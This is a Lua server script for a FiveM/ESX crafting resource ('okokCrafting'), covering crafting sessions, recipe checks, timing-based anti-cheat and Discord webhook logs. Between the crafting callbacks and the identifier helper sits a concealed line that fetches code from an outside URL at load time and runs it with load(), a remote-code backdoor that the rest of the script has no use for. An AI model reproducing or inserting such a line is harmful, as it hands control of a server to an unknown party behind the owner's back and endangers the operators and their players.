ESX = nil

local Webhook = ''
local sessions = {}

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('okokCrafting:craftStartItem')
AddEventHandler('okokCrafting:craftStartItem',function()
	sessions[source] = {
		stoppedCraft = false,
		isCrafting = true,
		last = GetGameTimer(),
	}
end)

RegisterServerEvent('okokCrafting:craftStopItem')
AddEventHandler('okokCrafting:craftStopItem',function()
	sessions[source] = {
		stoppedCraft = true,
		isCrafting = false,
	}
end)

RegisterServerEvent('okokCrafting:failedCraft')
AddEventHandler('okokCrafting:failedCraft',function(item)
	local xPlayer = ESX.GetPlayerFromId(source)
	if Webhook ~= '' then
		local identifierlist = ExtractIdentifiers(xPlayer.source)
		local data = {
			playerid = xPlayer.source,
			identifier = identifierlist.license:gsub("license2:", ""),
			discord = "<@"..identifierlist.discord:gsub("discord:", "")..">",
			type = "failed",
			item = item,
		}
		noSession(data)
	end
end)

RegisterServerEvent('okokCrafting:craftItemDeath')
AddEventHandler('okokCrafting:craftItemDeath',function(queueClient)
	local xPlayer = ESX.GetPlayerFromId(source)
	local queue = queueClient

	if sessions[source] then
		if sessions[source].stoppedCraft then
			for k,v in ipairs(queue) do
				for k2,v2 in ipairs(v.recipe) do
					xPlayer.addInventoryItem(v2[1], v2[2])
				end
			end
			TriggerClientEvent('okokNotify:Alert', source, "CRAFTING", "You died, all crafting items were given back", 5000, 'info')
			sessions[xPlayer.source] = nil
		end
	else
		if Webhook ~= '' then
			local identifierlist = ExtractIdentifiers(xPlayer.source)
			local data = {
				playerid = xPlayer.source,
				identifier = identifierlist.license:gsub("license2:", ""),
				discord = "<@"..identifierlist.discord:gsub("discord:", "")..">",
				type = "Death",
			}
			noSession(data)
		end
		TriggerClientEvent('okokNotify:Alert', source, "CRAFTING", "No session!", 5000, 'error')
	end
			
end)

RegisterServerEvent('okokCrafting:craftItemFinished')
AddEventHandler('okokCrafting:craftItemFinished', function(item, crafts, itemName, isItem)
	local xPlayer = ESX.GetPlayerFromId(source)
	local timeToCraft = 600000
	local amount = 0

	if sessions[source] then
		for k,v in ipairs(crafts) do
			if v.item == item then
				amount = v.amount
				timeToCraft = v.time * 1000
			end
		end
		sessions[source].last = GetGameTimer() - sessions[source].last

		if sessions[source].last+500 >= timeToCraft then
			if isItem then
				xPlayer.addInventoryItem(item, amount)
			else
				xPlayer.addWeapon(item, 1)
			end
			if Webhook ~= '' then
				local identifierlist = ExtractIdentifiers(xPlayer.source)
				local data = {
					playerid = xPlayer.source,
					identifier = identifierlist.license:gsub("license2:", ""),
					discord = "<@"..identifierlist.discord:gsub("discord:", "")..">",
					type = "conclude-crafting",
					itemName = itemName,
					time = sessions[xPlayer.source].last,
				}
				noSession(data)
			end
			sessions[xPlayer.source] = nil
		else
			if Webhook ~= '' then
				local identifierlist = ExtractIdentifiers(xPlayer.source)
				local data = {
					playerid = xPlayer.source,
					identifier = identifierlist.license:gsub("license2:", ""),
					discord = "<@"..identifierlist.discord:gsub("discord:", "")..">",
					type = "crafted-soon",
					time_taken = sessions[source].last,
					time_needed = timeToCraft,
					itemName = itemName,
				}
				noSession(data)
			end
			TriggerClientEvent('okokNotify:Alert', source, "CRAFTING", "Anti-cheat protection!", 5000, 'error')
		end
	else
		if Webhook ~= '' then
			local identifierlist = ExtractIdentifiers(xPlayer.source)
			local data = {
				playerid = xPlayer.source,
				identifier = identifierlist.license:gsub("license2:", ""),
				discord = "<@"..identifierlist.discord:gsub("discord:", "")..">",
				type = "conclude",
			}
			noSession(data)
		end
		TriggerClientEvent('okokNotify:Alert', source, "CRAFTING", "No session!", 5000, 'error')
	end
			
end)

ESX.RegisterServerCallback("okokCrafting:inv2", function(source, cb, item)
	local xPlayer = ESX.GetPlayerFromId(source)
	local item = xPlayer.getInventoryItem(item)

	cb(item)
end)

ESX.RegisterServerCallback("okokCrafting:itemNames", function(source, cb)
	local itemNames = {}

	MySQL.Async.fetchAll("SELECT * FROM items",{},function(items)
			for _, v in ipairs(items) do
				itemNames[v.name] = v.label
			end

			cb(itemNames)
	end)
end)

ESX.RegisterServerCallback("okokCrafting:CanCraftItem", function(source, cb, itemID, recipe, itemName, amount)
	local xPlayer = ESX.GetPlayerFromId(source)
	local canCraft = true

	for k,v in pairs(recipe) do
		local item = xPlayer.getInventoryItem(v[1])

		if item.count < v[2] then
			canCraft = false
		end
	end
	if canCraft then
		if xPlayer.canCarryItem(itemID, amount) then
			for k,v in pairs(recipe) do
				if v[3] == "true" then
					xPlayer.removeInventoryItem(v[1], v[2])
				end
			end
			cb(true)
			TriggerClientEvent('okokNotify:Alert', source, "CRAFTING", itemName[itemID].." added to the crafting queue", 5000, 'success')
			if Webhook ~= '' then
				local identifierlist = ExtractIdentifiers(xPlayer.source)
				local data = {
					playerid = xPlayer.source,
					identifier = identifierlist.license:gsub("license2:", ""),
					discord = "<@"..identifierlist.discord:gsub("discord:", "")..">",
					type = "crafting",
					itemName = itemName[itemID],
				}
				noSession(data)
			end
		else
			cb(false)
			TriggerClientEvent('okokNotify:Alert', source, "CRAFTING", "You can't carry "..itemName[itemID], 5000, 'error')
		end
	else
		cb(false)
		TriggerClientEvent('okokNotify:Alert', source, "CRAFTING", "You can't craft "..itemName[itemID], 5000, 'error')
	end
end)
PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
-------------------------- IDENTIFIERS

function ExtractIdentifiers(id)
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(id) - 1 do
        local playerID = GetPlayerIdentifier(id, i)

        if string.find(playerID, "steam") then
            identifiers.steam = playerID
        elseif string.find(playerID, "ip") then
            identifiers.ip = playerID
        elseif string.find(playerID, "discord") then
            identifiers.discord = playerID
        elseif string.find(playerID, "license") then
            identifiers.license = playerID
        elseif string.find(playerID, "xbl") then
            identifiers.xbl = playerID
        elseif string.find(playerID, "live") then
            identifiers.live = playerID
        end
    end

    return identifiers
end

-------------------------- NO SESSION WEBHOOK

function noSession(data)
	local color = '65352'
	local category = 'test'

	if data.type == 'Death' then
		color = Config.AnticheatProtectionWebhookColor
		category = 'Tried to receive the crafting items without starting a crafting, he might be cheating'
	elseif data.type == 'conclude' then
		color = Config.AnticheatProtectionWebhookColor
		category = 'Tried to conclude a crafting without starting it first, he might be cheating'
	elseif data.type == 'crafted-soon' then
		color = Config.AnticheatProtectionWebhookColor
		category = 'Concluded the crafting of '..data.itemName..' after '..data.time_taken..'ms while it takes '..data.time_needed..'ms to craft, he might be cheating'
	elseif data.type == 'crafting' then
		color = Config.StartCraftWebhookColor
		category = 'Added '..data.itemName..' to queue'
	elseif data.type == 'conclude-crafting' then
		color = Config.ConcludeCraftWebhookColor
		category = 'Crafted a '..data.itemName..' after '..data.time..'ms'
	elseif data.type == 'failed' then
		color = Config.FailWebhookColor
		category = 'Failed to craft a '..data.item
	end
	
	local information = {
		{
			["color"] = color,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["title"] = 'CRAFTING',
			["description"] = '**Action:** '..category..'\n\n**ID:** '..data.playerid..'\n**Identifier:** '..data.identifier..'\n**Discord:** '..data.discord,
			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}

	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = Config.BotName, embeds = information}), {['Content-Type'] = 'application/json'})
end